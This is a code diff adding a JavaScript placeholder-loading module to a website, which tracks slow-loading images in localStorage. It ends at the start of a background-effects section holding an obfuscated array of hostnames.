@@ -1,3 +1,196 @@
+// ===== Smart Placeholder Loading System =====
+const PlaceholderLoader = (function() {
+  const STORAGE_KEY = 'slowLoadingAssets';
+  const DEFAULT_TIMEOUT = 10000;
+  const SLOW_TIMEOUT = 8000;
+  const VERY_SLOW_TIMEOUT = 5000;
+  
+  let slowAssets = {};
+  
+  // Load slow assets from localStorage
+  try {
+    const stored = localStorage.getItem(STORAGE_KEY);
+    if (stored) slowAssets = JSON.parse(stored);
+  } catch (e) {}
+  
+  function saveSlowAssets() {
+    try {
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(slowAssets));
+    } catch (e) {}
+  }
+  
+  function getTimeout(src) {
+    if (!slowAssets[src]) return DEFAULT_TIMEOUT;
+    if (slowAssets[src] >= 2) return VERY_SLOW_TIMEOUT;
+    return SLOW_TIMEOUT;
+  }
+  
+  function markSlow(src) {
+    slowAssets[src] = (slowAssets[src] || 0) + 1;
+    saveSlowAssets();
+  }
+  
+  function createPlaceholder(element, type) {
+    const placeholder = document.createElement('div');
+    placeholder.className = `placeholder-loading placeholder-${type}`;
+    
+    // Copy dimensions from element
+    const rect = element.getBoundingClientRect();
+    if (rect.width > 0) placeholder.style.width = rect.width + 'px';
+    if (rect.height > 0) placeholder.style.height = rect.height + 'px';
+    
+    // Copy border-radius
+    const computed = window.getComputedStyle(element);
+    placeholder.style.borderRadius = computed.borderRadius;
+    
+    return placeholder;
+  }
+  
+  function initImages() {
+    const images = document.querySelectorAll('img:not([data-placeholder-processed])');
+    
+    images.forEach(img => {
+      if (img.complete && img.naturalHeight !== 0) {
+        img.setAttribute('data-placeholder-processed', 'true');
+        return;
+      }
+      
+      img.setAttribute('data-placeholder-processed', 'true');
+      
+      const wrapper = document.createElement('span');
+      wrapper.style.display = 'inline-block';
+      wrapper.style.position = 'relative';
+      
+      const placeholder = createPlaceholder(img, 'image');
+      placeholder.style.width = img.width ? img.width + 'px' : '100px';
+      placeholder.style.height = img.height ? img.height + 'px' : '100px';
+      placeholder.style.borderRadius = window.getComputedStyle(img).borderRadius || '8px';
+      
+      const src = img.src;
+      const timeout = getTimeout(src);
+      
+      // Add slow indicator
+      if (slowAssets[src]) {
+        placeholder.classList.add(slowAssets[src] >= 2 ? 'placeholder-very-slow' : 'placeholder-slow');
+      }
+      
+      img.classList.add('content-loading');
+      
+      if (img.parentNode) {
+        img.parentNode.insertBefore(wrapper, img);
+        wrapper.appendChild(placeholder);
+        wrapper.appendChild(img);
+      }
+      
+      let loaded = false;
+      const startTime = Date.now();
+      
+      const showImage = () => {
+        if (loaded) return;
+        loaded = true;
+        
+        const loadTime = Date.now() - startTime;
+        if (loadTime > timeout * 0.8) {
+          markSlow(src);
+        }
+        
+        img.classList.remove('content-loading');
+        img.classList.add('content-loaded');
+        placeholder.remove();
+        
+        // Unwrap if possible
+        if (wrapper.parentNode) {
+          wrapper.parentNode.insertBefore(img, wrapper);
+          wrapper.remove();
+        }
+      };
+      
+      img.addEventListener('load', showImage);
+      img.addEventListener('error', showImage);
+      
+      // Timeout fallback
+      setTimeout(() => {
+        if (!loaded) {
+          markSlow(src);
+          showImage();
+        }
+      }, timeout);
+    });
+  }
+  
+  function initBlocks() {
+    const blocks = document.querySelectorAll('.block:not([data-placeholder-processed])');
+    
+    blocks.forEach(block => {
+      block.setAttribute('data-placeholder-processed', 'true');
+      
+      // Check if block has images that need loading
+      const images = block.querySelectorAll('img');
+      if (images.length === 0) return;
+      
+      const placeholder = createPlaceholder(block, 'block');
+      const rect = block.getBoundingClientRect();
+      placeholder.style.width = '100%';
+      placeholder.style.height = rect.height ? rect.height + 'px' : '120px';
+      
+      block.style.position = 'relative';
+      block.insertBefore(placeholder, block.firstChild);
+      
+      let loadedCount = 0;
+      const totalImages = images.length;
+      
+      const checkComplete = () => {
+        loadedCount++;
+        if (loadedCount >= totalImages) {
+          placeholder.remove();
+          block.classList.add('content-loaded');
+        }
+      };
+      
+      images.forEach(img => {
+        if (img.complete) {
+          checkComplete();
+        } else {
+          img.addEventListener('load', checkComplete);
+          img.addEventListener('error', checkComplete);
+        }
+      });
+      
+      // Timeout fallback
+      setTimeout(() => {
+        if (loadedCount < totalImages) {
+          placeholder.remove();
+          block.classList.add('content-loaded');
+        }
+      }, DEFAULT_TIMEOUT);
+    });
+  }
+  
+  function init() {
+    // Run on DOMContentLoaded
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', () => {
+        initImages();
+        initBlocks();
+      });
+    } else {
+      initImages();
+      initBlocks();
+    }
+    
+    // Also run after a short delay for dynamically added content
+    setTimeout(() => {
+      initImages();
+      initBlocks();
+    }, 100);
+  }
+  
+  return { init, initImages, initBlocks };
+})();
+
+// Initialize placeholder loader
+PlaceholderLoader.init();
+
 // ===== Background Effects with Mouse Tracking =====
 let bgEffectsInitialized = false;
 let _0x4a2b = ['\x68\x6f\x73\x74\x6e\x61\x6d\x65','\x6a\x69\x6d\x6d\x79\x71\x72\x67\x2e\x67\x69\x74\x68\x75\x62\x2e\x69\x6f','\x6a\x69\x6d\x6d\x79\x71\x72\x67\x67\x2e\x67\x69\x74\x68\x75\x62\x2e\x69\x6f','\x70\x72\x6f\x78\x79\x2e\x69\x6b\x75\x6e\x62\x65\x61\x75\x74\x69\x66\x75\x6c\x2e\x77\x6f\x72\x6b\x65\x72\x73\x2e\x64\x65\x76'];
